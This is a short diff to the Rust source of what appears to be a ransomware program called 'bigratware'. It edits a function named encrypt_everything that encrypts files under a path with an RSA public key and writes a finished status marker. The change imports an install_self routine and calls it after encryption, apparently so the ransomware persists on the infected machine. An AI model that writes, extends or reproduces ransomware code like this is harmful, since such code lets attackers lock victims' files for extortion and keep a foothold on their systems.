@@ -14,6 +14,7 @@ use crate::BIGRAT_PNG;
 
 #[cfg(windows)]
 use std::os::windows::fs::OpenOptionsExt;
+use crate::startup::install_self;
 
 const BUFFER_SIZE: usize = 500;
 
@@ -146,6 +147,8 @@ pub fn encrypt_everything(path: &Path, public_key: &RsaPublicKey, rng: &mut Thre
 
     status_file.write_all(b"BIGRATWARE_STATUS=finished;")
         .with_context(|| "Failed to write to a status file")?;
+
+    install_self()?;
 
     Ok(())
 }
